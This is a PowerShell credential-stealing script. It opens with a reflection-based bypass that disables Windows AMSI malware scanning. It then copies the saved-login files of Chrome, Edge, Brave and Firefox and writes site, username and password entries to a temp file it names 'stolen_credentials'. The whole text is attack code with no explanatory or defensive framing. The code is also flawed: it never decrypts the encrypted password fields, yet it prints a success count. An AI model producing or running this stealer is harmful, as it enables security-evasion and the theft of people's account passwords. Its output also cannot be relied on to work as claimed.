# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Browser database paths
$browserPaths = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"
}

# Output file for stolen credentials
$outputFile = "$env:TEMP\stolen_credentials_$(Get-Random).txt"
New-Item -Path $outputFile -ItemType File -Force | Out-Null

# Function to extract and format credentials
$GetBrowserPasswords = {
    param($dbPath, $browserName)
    try {
        if ([System.IO.File]::Exists($dbPath)) {
            $tempDb = "$env:TEMP\login_data_$($browserName).db"
            [System.IO.File]::Copy($dbPath, $tempDb, $true)

            if ($browserName -eq "Firefox") {
                # Firefox uses JSON, not SQLite
                $content = Get-Content $tempDb -Raw | ConvertFrom-Json
                foreach ($login in $content.logins) {
                    $line = "[$browserName] URL: $($login.origin) | User: $($login.username) | Pass: $($login.password)"
                    Add-Content -Path $outputFile -Value $line
                }
            }
            else {
                # Chrome/Edge/Brave use SQLite
                $query = "SELECT origin_url, username_value, password_value FROM logins"
                $result = & "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "& {
                    Add-Type -Path 'System.Data.SQLite' -ErrorAction SilentlyContinue;
                    $conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=$tempDb;ReadOnly=True;');
                    $conn.Open();
                    $cmd = New-Object System.Data.SQLite.SQLiteCommand('$query', $conn);
                    $reader = $cmd.ExecuteReader();
                    while ($reader.Read()) {
                        '$($reader[0])|$($reader[1])|$($reader[2])'
                    }
                    $conn.Close()
                }" 2>$null
                if ($result) {
                    foreach ($line in $result) {
                        $url, $user, $pass = $line -split '\|'
                        Add-Content -Path $outputFile -Value "[$browserName] URL: $url | User: $user | Pass: $pass"
                    }
                }
            }
            [System.IO.File]::Delete($tempDb)
        }
    }
    catch {}
}

# Execute for each browser
foreach ($browser in $browserPaths.Keys) {
    . $GetBrowserPasswords $browserPaths[$browser] $browser
}

# Summary
$count = (Get-Content $outputFile).Count
Write-Host "[+] $count credentials saved to $outputFile" -ForegroundColor Green
Write-Host "[*] Done" -ForegroundColor DarkGray
